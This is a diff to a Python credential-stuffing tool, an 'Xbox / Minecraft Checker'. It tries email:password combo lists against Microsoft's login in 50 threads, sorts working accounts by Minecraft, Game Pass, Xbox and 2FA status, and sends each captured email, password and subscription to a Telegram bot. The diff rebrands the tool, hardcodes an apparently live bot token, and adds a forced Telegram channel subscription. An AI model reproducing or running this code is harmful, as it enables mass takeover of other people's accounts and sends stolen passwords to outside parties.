@@ -35,9 +35,10 @@ urllib3.disable_warnings()
 warnings.filterwarnings("ignore")
 
 # ══════════════════════════════════════════════
-WELCOME_VIDEO_URL = "https://t.me/QuatrHuit/2"
-MY_SIGNATURE      = "@pypkg"
-CHANNEL           = "https://t.me/QuatrHuit/"
+WELCOME_VIDEO_URL = "https://t.me/r1iv_k/2"
+MY_SIGNATURE      = "@r1ivk"
+CHANNEL           = "https://t.me/r1iv_k"
+REQUIRED_CHANNEL  = "@r1iv_k"
 
 SFTAG_URL = (
     "https://login.live.com/oauth20_authorize.srf"
@@ -51,15 +52,15 @@ MAX_RETRIES     = 3
 REQUEST_TIMEOUT = 10
 THREAD_COUNT    = 50
 
-BOT_TOKEN = ""
+BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
 CHAT_ID   = ""
 
 # ══════════════════════════════════════════════
 BANNER = f"""
-{Fore.CYAN} ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
+{Fore.CYAN} ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗  
 {Fore.CYAN}██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 {Fore.CYAN}██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
-{Fore.CYAN}██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
+{Fore.CYAN}██║     ██╔══██║██╔══╝  ██║     ██╔-██╗ ██╔══╝  ██╔══██╗
 {Fore.CYAN}╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
 {Fore.CYAN} ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 {Fore.WHITE}{'─'*57}
@@ -108,11 +109,11 @@ def create_folders():
 folders = create_folders()
 
 FILE_MAP = {
-    "minecraft":  "Results/Minecraft/Minecraft-hits_by_@pyabrodies.txt",
-    "gamepass":   "Results/GamePass/game_pass-hits_by_@pyabrodies.txt",
-    "xbox":       "Results/Xbox/xbox-hits_by_@pyabrodies.txt",
-    "not_linked": "Results/HitNotLinked/not_linked_by_@pyabrodies.txt",
-    "twofa":      "Results/2FA/2fa_by_@pyabrodies.txt",
+    "minecraft":  "Results/Minecraft/Minecraft-hits_by_@r1ivk.txt",
+    "gamepass":   "Results/GamePass/game_pass-hits_by_@r1ivk.txt",
+    "xbox":       "Results/Xbox/xbox-hits_by_@r1ivk.txt",
+    "not_linked": "Results/HitNotLinked/not_linked_by_@r1ivk.txt",
+    "twofa":      "Results/2FA/2fa_by_@r1ivk.txt",
 }
 
 def save_hit(category, content):
@@ -131,6 +132,21 @@ class TelegramBot:
         self.token    = token
         self.chat_id  = chat_id
         self.base_url = f"https://api.telegram.org/bot{token}"
+
+    def check_subscription(self, user_id):
+        """التحقق مما إذا كان المستخدم مشتركاً في القناة الإجبارية"""
+        try:
+            url = f"{self.base_url}/getChatMember"
+            resp = requests.get(url, params={"chat_id": REQUIRED_CHANNEL, "user_id": user_id}, timeout=10)
+            if resp.status_code == 200:
+                data = resp.json()
+                if data.get("ok"):
+                    status = data["result"].get("status")
+                    if status in ["member", "administrator", "creator"]:
+                        return True
+        except:
+            pass
+        return False
 
     def send_message(self, text):
         try:
@@ -176,6 +192,13 @@ class TelegramBot:
 bot: TelegramBot = None  # set in main
 
 def tg_send_welcome():
+    # التحقق من اشتراك صاحب الـ Chat ID بالقناة قبل الإرسال
+    if CHAT_ID and CHAT_ID.isdigit():
+        if not bot.check_subscription(int(CHAT_ID)):
+            print(f"{Fore.RED}  ✗ المستخدم غير مشترك في القناة الإجبارية {REQUIRED_CHANNEL}! يرجى الاشتراك ليتمكن البوت من العمل.{Style.RESET_ALL}")
+            bot.send_message(f"❌ عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه:\n{CHANNEL}")
+            return False
+
     caption = (
         "🎮 <b>Xbox / Minecraft Checker</b>\n\n"
         "🔍 <b>About this tool:</b>\n"
@@ -223,7 +246,7 @@ def tg_send_hit(email, password, account_type,
         f"🏷 <b>Type:</b> {account_type}\n"
         f"🎫 <b>Subscriptions:</b> {subscriptions}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"📢 @HoTmIlToOLs | 👤 @pyabrodies"
+        f"📢 {REQUIRED_CHANNEL} | 👤 {MY_SIGNATURE}"
     )
 
     if gamerpic and gamerpic != "N/A" and gamerpic.startswith("http"):
@@ -260,13 +283,13 @@ def tg_send_final():
         f"🔓 <b>Not Linked:</b> {stats.not_linked}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"⚡ <b>CPM:</b> {stats.get_cpm()}\n"
-        f"📢 @HoTmIlToOLs | 👤 @pyabrodies"
+        f"📢 {REQUIRED_CHANNEL} | 👤 {MY_SIGNATURE}"
     )
     bot.send_message(msg)
 
 def tg_send_files():
     for cat, path in FILE_MAP.items():
-        bot.send_document(path, f"📁 {os.path.basename(path)} | @pyabrodies")
+        bot.send_document(path, f"📁 {os.path.basename(path)} | {MY_SIGNATURE}")
         time.sleep(0.5)
 
 # ══════════════════════════════════════════════
@@ -289,9 +312,9 @@ def print_table(total):
     print(f"{Fore.WHITE}│ {Fore.YELLOW}Status checking...{' '*(W-19)}{Fore.WHITE}│{Style.RESET_ALL}")
     separator()
 
-    row(f"✓ True ", stats.hits,    Fore.GREEN)
-    row(f"✗ Bad  ", stats.bad,     Fore.RED)
-    row(f"🔒 2FA ", stats.twofa,   Fore.YELLOW)
+    row(f"✓ True ", stats.hits,   Fore.GREEN)
+    row(f"✗ Bad  ", stats.bad,    Fore.RED)
+    row(f"🔒 2FA ", stats.twofa,  Fore.YELLOW)
     row(f"↺ Retry", stats.retries,Fore.MAGENTA)
 
     separator()
@@ -300,7 +323,7 @@ def print_table(total):
 
     row(f"⛏  Minecraft  ", stats.minecraft,  Fore.GREEN)
     row(f"🎮  Game Pass  ", stats.gamepass,   Fore.CYAN)
-    row(f"🕹  Xbox        ", stats.xbox,       Fore.BLUE)
+    row(f"🕹  Xbox       ", stats.xbox,       Fore.BLUE)
     row(f"🔓  Not Linked ", stats.not_linked, Fore.YELLOW)
 
     separator()
@@ -591,7 +614,7 @@ def check_account(combo):
                 f"Tier          : {tier}\n"
                 f"Reputation    : {rep}\n"
                 f"Type          : Xbox (Not Linked)\n"
-                f"By @pyabrodies\n"
+                f"By {MY_SIGNATURE}\n"
                 f"{'='*50}"
             )
             save_hit("not_linked", capture)
@@ -621,7 +644,7 @@ def check_account(combo):
             f"Capes         : {capes}\n"
             f"Type          : {account_type}\n"
             f"Subscriptions : {subs_str}\n"
-            f"By @pyabrodies\n"
+            f"By {MY_SIGNATURE}\n"
             f"{'='*50}"
         )
 
@@ -649,13 +672,12 @@ def check_account(combo):
 
 # ══════════════════════════════════════════════
 def main():
-    global BOT_TOKEN, CHAT_ID, bot
+    global CHAT_ID, bot
 
     print(BANNER)
 
-    CHAT_ID   = input(f"{Fore.CYAN}  Enter your Telegram ID   : {Style.RESET_ALL}").strip()
-    BOT_TOKEN = input(f"{Fore.CYAN}  Enter your Bot Token     : {Style.RESET_ALL}").strip()
-    combo_file = input(f"{Fore.CYAN}  Enter combo file path    : {Style.RESET_ALL}").strip()
+    CHAT_ID    = input(f"{Fore.CYAN}  Enter your Telegram ID  : {Style.RESET_ALL}").strip()
+    combo_file = input(f"{Fore.CYAN}  Enter combo file path   : {Style.RESET_ALL}").strip()
     print()
 
     if not os.path.exists(combo_file):
@@ -676,11 +698,12 @@ def main():
     print(f"{Fore.CYAN}  ✓ Threads : {THREAD_COUNT}{Style.RESET_ALL}")
     print(f"{Fore.CYAN}  ✓ Results → ./Results/{Style.RESET_ALL}\n")
 
-    print(f"{Fore.YELLOW}  → Sending welcome video to Telegram...{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}  → Verifying Telegram subscription and sending welcome video...{Style.RESET_ALL}")
     if tg_send_welcome():
-        print(f"{Fore.GREEN}  ✓ Welcome video sent!{Style.RESET_ALL}\n")
+        print(f"{Fore.GREEN}  ✓ Welcome video sent successfully!{Style.RESET_ALL}\n")
     else:
-        print(f"{Fore.YELLOW}  ⚠ Could not send video{Style.RESET_ALL}\n")
+        print(f"{Fore.RED}  ✗ Operation stopped: The user must be subscribed to {REQUIRED_CHANNEL} to use the tool.{Style.RESET_ALL}\n")
+        return
 
     input(f"{Fore.GREEN}  Press ENTER to start checking...{Style.RESET_ALL}")
 
